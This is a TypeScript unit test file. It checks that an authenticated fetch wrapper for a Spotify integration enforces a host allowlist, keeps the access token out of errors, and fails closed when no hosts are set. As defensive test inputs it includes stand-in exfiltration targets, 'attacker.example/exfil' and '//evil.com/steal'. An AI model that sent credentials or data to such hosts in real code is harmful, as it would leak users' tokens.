import { expect, test } from 'vitest'
import { http, HttpResponse } from 'msw'
import {
	type CapabilityArgs,
	type KodyNamespace,
	IntegrationHostNotAllowedError,
	createAuthenticatedFetch,
} from './kody-runtime-utils.ts'
import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
import { createMswNodeServer } from '#worker/test-support/msw-node-server.ts'

const fakeAccessToken = 'test-access-token-abc123'
const spotifyAccessTokenPlaceholder =
	'Bearer {{secret:spotifyAccessToken|scope=user}}'

const spotifyIntegration = {
	name: 'spotify',
	tokenUrl: 'https://accounts.spotify.test/api/token',
	apiBaseUrl: 'https://api.spotify.com/v1',
	flow: 'pkce' as const,
	clientId: 'spotify-client-id',
	clientSecretSecretName: null,
	accessTokenSecretName: 'spotifyAccessToken',
	refreshTokenSecretName: 'spotifyRefreshToken',
	requiredHosts: ['api.spotify.com', 'cdn.spotify.com'],
}

function createKody(integration = spotifyIntegration) {
	const kody = {
		async integration_get(args: CapabilityArgs) {
			expect(args.name).toBe('spotify')
			return { integration }
		},
		async secret_set_many() {
			return { ok: true, assertOnly: false, secrets: [] }
		},
	} satisfies KodyNamespace

	return kody
}

function createSpotifyHandlers(fetchCalls: Array<Request>) {
	return [
		http.post(spotifyIntegration.tokenUrl, () =>
			HttpResponse.json({ access_token: fakeAccessToken }),
		),
		http.get('https://api.spotify.com/v1/me', async ({ request }) => {
			fetchCalls.push(request.clone())
			return HttpResponse.json({ ok: true })
		}),
		http.get(
			'https://cdn.spotify.com/images/cover.jpg',
			async ({ request }) => {
				fetchCalls.push(request.clone())
				return HttpResponse.json({ ok: true })
			},
		),
	]
}

test('createAuthenticatedFetch enforces integration host allowlists and fails closed without configured hosts', async () => {
	const kody = createKody()
	const fetchCalls: Array<Request> = []

	using _server = createMswNodeServer(createSpotifyHandlers(fetchCalls))
	const authenticatedFetch = await createAuthenticatedFetch(kody, 'spotify')

	const fetchCallsAfterSetup = fetchCalls.length

	try {
		await authenticatedFetch('https://attacker.example/exfil')
		expect.unreachable('expected disallowed host rejection')
	} catch (error) {
		expect(error).toBeInstanceOf(IntegrationHostNotAllowedError)
		expect(String(error)).not.toContain(fakeAccessToken)
		expect(JSON.stringify(error)).not.toContain(fakeAccessToken)
	}
	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)

	const apiResponse = await authenticatedFetch('https://api.spotify.com/v1/me')
	expect(apiResponse.status).toBe(200)
	const apiCall = fetchCalls[fetchCalls.length - 1]!
	expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
	expect(apiCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	const cdnResponse = await authenticatedFetch(
		'https://cdn.spotify.com/images/cover.jpg',
	)
	expect(cdnResponse.status).toBe(200)
	const cdnCall = fetchCalls[fetchCalls.length - 1]!
	expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
	expect(cdnCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	expect(() =>
		assertIntegrationHostAllowed(
			'spotify',
			spotifyIntegration,
			'//evil.com/steal',
		),
	).toThrow(IntegrationHostNotAllowedError)
	expect(() =>
		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
	).not.toThrow()

	const emptyAllowlistFetchCalls: Array<Request> = []
	using _emptyAllowlistServer = createMswNodeServer([
		http.post(spotifyIntegration.tokenUrl, () =>
			HttpResponse.json({ access_token: fakeAccessToken }),
		),
		http.get('https://anything.example/data', async ({ request }) => {
			emptyAllowlistFetchCalls.push(request.clone())
			return HttpResponse.json({ ok: true })
		}),
	])
	const emptyAllowlistFetch = await createAuthenticatedFetch(
		createKody({
			...spotifyIntegration,
			requiredHosts: [],
			apiBaseUrl: null,
		}),
		'spotify',
	)
	const fetchCallsBefore = emptyAllowlistFetchCalls.length
	await expect(
		emptyAllowlistFetch('https://anything.example/data'),
	).rejects.toThrow(/no allowed hosts configured/)
	expect(emptyAllowlistFetchCalls.length).toBe(fetchCallsBefore)
})
